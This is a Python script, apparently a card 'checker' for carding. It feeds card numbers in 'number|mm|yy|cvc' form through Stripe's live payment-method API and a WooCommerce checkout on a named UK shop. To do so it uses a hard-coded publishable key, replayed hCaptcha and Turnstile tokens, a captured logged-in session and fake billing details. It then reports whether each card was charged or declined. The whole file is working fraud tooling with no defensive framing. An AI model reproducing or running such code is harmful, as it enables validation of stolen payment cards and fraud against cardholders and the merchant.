import requests
import re
import random
import time
import user_agent
import string
from fake_useragent import UserAgent
import base64
from bs4 import BeautifulSoup
from faker import Faker
def st(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
	import requests
	
	headers = {
    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
}
	
	data = f'type=card&billing_details[name]=Christa+afadf&billing_details[address][line1]=1981+Jennifer+Lane&billing_details[address][state]=EGMT&billing_details[address][city]=Raleigh&billing_details[address][postal_code]=LA22+9PR&billing_details[address][country]=EG&billing_details[email]=adfadfadfeaqfa%40gmail.com&billing_details[phone]=09195157628&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b00df8b5-43e4-4f4f-a656-4ed7ab7b951905ebc2&muid=c174f38a-5816-4cff-b69a-6eb103dfa81708274a&sid=603c898b-36af-4f18-a0d2-b1b0fadb955521cd50&payment_user_agent=stripe.js%2Fe811bc65bb%3B+stripe-js-v3%2Fe811bc65bb%3B+split-card-element&referrer=https%3A%2F%2Fwww.thonk.co.uk&time_on_page=38942&key=pk_live_VWRYPEVH9pBGaepBeXg0Ok0x00jrcIdpr2&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZbSXnwLVlsHr85SV6Roxtc3QbiqwyX746-jPjhoaBKYeUF8eljSUFrf3O5Xv_OiSxidemyHugOp1PHhDEca2zP5YNdP0bN7NB2rHSpkTx8kbniZHnSfarANIpxl0YUKw6Q_d-vb9V50pUB6s7vs-uzaPcs8_1tUDtBdvaEeKgxvLCm0HQKQM2gssyWkqrK_YJK9XqZZ4tZEkpyatuIFDAF4_HFY1umHbnKzlVUER2j73JOkrM70mFziTSWHeknHVY-EkVXcyDiyAeDXTT6pqBbDnOWQYkmiGqiCgVDvbsPkXYFZv5QyOU4CNQ8hISz4UzQwZ2jHq_Cxu3rXjQ9PaqBKTtU7e8Lq6yT2AntJ5_cwLtIejTYxscX302POokWA6Galbfj_n_xWMNFMzW9IjyO11FZzcgMsPMo3Bh6gonITHlLOmHV9tLqcbQlDKpRziEfw6L1QUHV4z82JtFZv73mnUJBJIt1D83EOVWc-bmeh7TfqM9ZVLP_iyFjKhPM7OCLuS8l6czs8nflV9B8x7kPVRjGGHyz1FQ0vZomKVvJAoIxBJT36m4Nz9djPEtDAHrSe6Eqjcff5nqCw5MEyZThXJ7Cm5iBCYT618X0F74BjZC7-qyy4mK7uJmdI8wzMwczLEmU_WDSE80HYBtIfn44n70nqQ4c9Tyc5mH_FYIFfm4AnDG1ywl3nW8KfI9Ej0cT8ui9MpXZyaNg1mpga0T8BV5B4OUYIZffqlVPyRQ4VJsqj-XQG6I0deI-iH5bAdiqw1IEGYYv3pNLDPKqvfmEHqlzaUKmKACMqAq_5HXrZr_lh51Qv9vmgC2BQYqMhUyOWZeC2gTp_LTwQlmOIxfJuQmxMx7PF5M-k-6bDS8V104sXtb8XvRAkyw_OCS3LeNUWG8EP-rPVSlmpbvEsGonMM62LQm94xRtjZEKF77vOqtN60E5Grx1HKRIRqFV8bv_ZF6U9xr8C-EQif_x_BZtzJUiCyqNn-_fd31oEhmXHhSrx4n2XhUVKXef0tiBRYWNxgidbnVVEXn4psasbYsAD4fReXma0zh-uyntstK5GOCCrmpjeQ5ugeKuFn0fJfbKNNaAYjCvSZhhHjPwKWUlmURSebubBPORgQ6vSKi1z4d1joWm4rozcmb5f3FM0xe2sHllkts9HEhhpN1U7kN_5oUmVOXjOLx61hqdR3m_lLi8zrmuBBtMmMD7vLcu8F7GFLJbXLHRw1XQNTbSiNDPyT49ur34ty3kc5au6dj-zJfzQqAZ-ivm2Vo6F37pJEdCMw6ZiVaWHB-DiQJo0HvwZ6JFbevgGcTMlluDYm-YksW0b6GqrdJpq8B8cPAMbYFew8bvc7qSITMDuiRM31WdW_G9QbkZN5qtHzMZK3iHqc_NqN9KCgBfU19sYeAcxk07kRkhFDr_wxEGKi2WdeWQvSc_aDUYlyg6JkTYe78jyO3AkXJXIr9TCoEZWyL-cGGxyqvfNErA8DHRg2waLZKx-4eOG2fy_R4OcpdvznIBPpXLfBmiJy5IJpA7bWxW3yNxnCr-JPhFbLbqIM-B8Rng9ec0iJe8WUIVY17OJ9BvrXYeH6nBoyj_1u7TkPB-wOx5A8bNhAzYw5d5OfVAv4uyrGumeJSKtHc7WkN9AZCGfUp4W6E2tSssBxROsl2WxoqPOXhwynFjcJ47zSwbcK2mSmxpy-NqnZTdMbcfQZ2IxFcsjAeco_-i8HL8eZQFGHefA-bkpA1kq3BskE-m1I58cqKdyNLODz5PUtYXzS0SpnrxcxLc_pNAB3bRJQRY-dZweVhG1VZpwazhqYbOv8L8qn_thyQfP1UXDFnhexxIZlkvpf31fBVuPUVUU6v0HuwYvXxlMGUaBJvf-aBHsOrIV6tVWilpnxedL8XfTpqwAZn3pJcNOqyQ0duwDm4JWqaD6Zdz6yd0nBwjRgJ6779dP80bmaDQrbZ-pcQ-uBQmSfvc9zzxeHKICweXWUOsn8l8Ia7xRSK_5D6rZQ5CDrGl_npR5AJqUkGaEHT2wmHY3iDoZjgQVqi-7eUhYhxhsUX9wYS7Q2ySgdfUxfRc0RrDXeE3J7Sz3v9KY2u58t_aspUSfwP7LZXjVnuxmWRJbB7MpbieZS09cvZOmZvonBx9OvBpbax1-vbg8NoQsk4bSLilQ93Qth80v0IWnaNleHDOZqrN4KhzaGFyZF9pZM4DMYNvomtyqDMzYjYzNWQ1onBkAA.dMUv7i-y838WAlS1tbPynXtOhSERnnP5FNhkAv-b78E'


	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	cookies = {
    '_fbp': 'fb.2.1722469651696.578226643695042469',
    '__stripe_mid': 'c174f38a-5816-4cff-b69a-6eb103dfa81708274a',
    '__stripe_sid': '603c898b-36af-4f18-a0d2-b1b0fadb955521cd50',
    'woocommerce_current_currency': 'GBP',
    'woocommerce_items_in_cart': '1',
    'wordpress_logged_in_f9aab48a6c2081ab1ed041c553ba2d31': 'adfadfadfeaqfa%7C1723679325%7CsPJdEdiiAfsUJmrkJVmzMY0x7nUf1WtJJbIqyWCrkNc%7Ccd7cdf7ef58e82cd3e8d20ee3310cf57c8d0037d0aef52c1d5a61a6180d5cb84',
    'wp_woocommerce_session_f9aab48a6c2081ab1ed041c553ba2d31': '97265%7C%7C1722642476%7C%7C1722638876%7C%7C041e7c6954c148a6ca2b62c2d4364aea',
    'woocommerce_cart_hash': '8e2b5c7e0dc4d780ead2f953373d72fb',
}
	
	headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.2.1722469651696.578226643695042469; __stripe_mid=c174f38a-5816-4cff-b69a-6eb103dfa81708274a; __stripe_sid=603c898b-36af-4f18-a0d2-b1b0fadb955521cd50; woocommerce_current_currency=GBP; woocommerce_items_in_cart=1; wordpress_logged_in_f9aab48a6c2081ab1ed041c553ba2d31=adfadfadfeaqfa%7C1723679325%7CsPJdEdiiAfsUJmrkJVmzMY0x7nUf1WtJJbIqyWCrkNc%7Ccd7cdf7ef58e82cd3e8d20ee3310cf57c8d0037d0aef52c1d5a61a6180d5cb84; wp_woocommerce_session_f9aab48a6c2081ab1ed041c553ba2d31=97265%7C%7C1722642476%7C%7C1722638876%7C%7C041e7c6954c148a6ca2b62c2d4364aea; woocommerce_cart_hash=8e2b5c7e0dc4d780ead2f953373d72fb',
    'origin': 'https://www.thonk.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.thonk.co.uk/checkout/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    }
	params = {
    'wc-ajax': 'checkout',
}
	
	data = {
    'billing_country': 'EG',
    'billing_first_name': 'Christa',
    'billing_last_name': 'afadf',
    'billing_company': '',
    'billing_address_1': '1981 Jennifer Lane',
    'billing_address_2': '',
    'billing_city': 'Raleigh',
    'billing_state': 'EGMT',
    'billing_postcode': 'LA22 9PR',
    'billing_email': 'adfadfadfeaqfa@gmail.com',
    'billing_phone': '09195157628',
    'billing_vat_number': '',
    'shipping_country': 'GB',
    'shipping_first_name': '',
    'shipping_last_name': '',
    'shipping_company': '',
    'shipping_address_1': '',
    'shipping_address_2': '',
    'shipping_city': '',
    'shipping_state': '',
    'shipping_postcode': '',
    'shipping_method[0]': 'table_rate:134:1077',
    'payment_method': 'stripe',
    'terms': 'on',
    'terms-field': '1',
    'cf-turnstile-response': '0.hAHxCYfJGyboqplbbX8EXemPtRVanX0qgExIryZiXX-YJ9K-ONh6BeDIdGWvfqG3WflrGbMkjYEqe3GMQitteqdHQJiokT0rLWKukA4SOTtNNYncCY2eztjLsylvoxH9Z5lzxGWF70mP3gO6cPS9XYE5L9kCiY_UFLRkuD1V9swaDh6O9nEBH6425VquxU8PoBR40aC7Czj0JrH1Rm_2BvoELbUaP4gy_-dp2j0b8d-ZqWf0dM5LTJrQTAIBG7CvRfacp17Bd99rl49fKNC8i3UilXkeVQcX_SHY2E5TqlnEeE1sKcpVEmqg_sbPNrZw8NuLw12ixlvZ6ZpzQdL_710Par47cQZUKfv9T6an1e7m68bfgXGjF7rQo1Y_EndMwya5dmBCkqaxoNI97C-oA9TDhRiVQ0Jpp9x3sxI-tqujcDzrjOjqaLo9zfulvDeiHE1sUJs2tUEps_o8IdIfYg.nwfKIbrkrdNt6IS_h7_gYg.5d0c3e37ea415e9ff157c13119cab7b3a2272c3bcf9b82823847c24b54ede5b5',
    'woocommerce-process-checkout-nonce': 'a1097cf65c',
    '_wp_http_referer': '/?wc-ajax=update_order_review',
    'stripe_source': id,
}
	
	response = requests.post('https://www.thonk.co.uk/', params=params, cookies=cookies, headers=headers, data=data)
	last=response.text
	if 'CHARGED' in last or 'success' in last or 'Success' in last or 'Your payment has already been processed' in last or 'succeeded' in last or 'success' in last or 'Thank' in last:
		return 'success'
	elif 'Sorry, your session has expired.' in last:
		return 'Your card was declined.'
	try:
		m=(response.json()['messages'])
		m=m.split('class=\"woocommerce-error\">\n\t\t\t<li>')[1].split('</li>\n\t</ul>\n')[0]
		return m
	except:
		return 'Your card was declined.'